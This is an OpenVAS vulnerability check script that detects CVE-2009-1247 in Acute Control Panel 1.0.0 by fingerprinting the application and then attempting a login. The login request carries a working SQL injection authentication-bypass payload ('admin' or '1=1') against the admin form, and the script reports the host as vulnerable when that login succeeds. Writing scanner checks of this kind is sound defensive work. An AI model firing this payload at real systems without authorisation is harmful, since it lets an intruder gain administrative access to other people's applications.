###############################################################################
# OpenVAS Vulnerability Test
# $Id: acute_control_panel_34265.nasl 15 2013-10-27 12:49:54Z jan $
#
# Acute Control Panel SQL Injection Vulnerability and Remote File
# Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Acute Control Panel is prone to multiple input-validation
  vulnerabilities, including an SQL-injection issue and and multiple
  remote file-include issues.

  A successful exploit may allow an attacker to execute malicious code
  within the context of the webserver process, compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.

  Acute Control Panel 1.0.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100089);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-29 17:14:47 +0200 (Sun, 29 Mar 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-1247");
 script_bugtraq_id(34265);
 script_tag(name:"risk_factor", value:"High");

 script_name("Acute Control Panel SQL Injection Vulnerability and Remote File Include Vulnerability");
 desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if Acute Control Panel is vulnerable to SQL Injection");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34265");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/acute-cp",cgi_dirs());
foreach dir (dirs) {

    url = string(dir, "/");
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if( buf == NULL )continue;

    if( egrep(pattern: 'meta name="generator" content="acute-cp.*" />', string: buf) ||
	egrep(pattern: 'Powered by <a href=[^>]+>Acute CP</a>', string: buf) ) {
	    variables = string("username=admin%20%27%20or%20%27%201=1&password=");
	    filename = string(dir + "/acute-cp/");
	    host=get_host_name();

	    req = string(
	      "POST ", filename, " HTTP/1.0\r\n", 
	      "Referer: ","http://", host, filename, "\r\n",
	      "Host: ", host, ":", port, "\r\n", 
	      "Content-Type: application/x-www-form-urlencoded\r\n", 
	      "Content-Length: ", strlen(variables), 
	      "\r\n\r\n", 
	      variables
	    );

	    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
	    if( result == NULL )continue;

	    if(
	       egrep(pattern: "You are now logged in", string: result) &&
	       egrep(pattern: "Logout</a>", string: result) )
	     {
	         security_hole(port);
	         exit(0);
	     }
    }
}

exit(0);
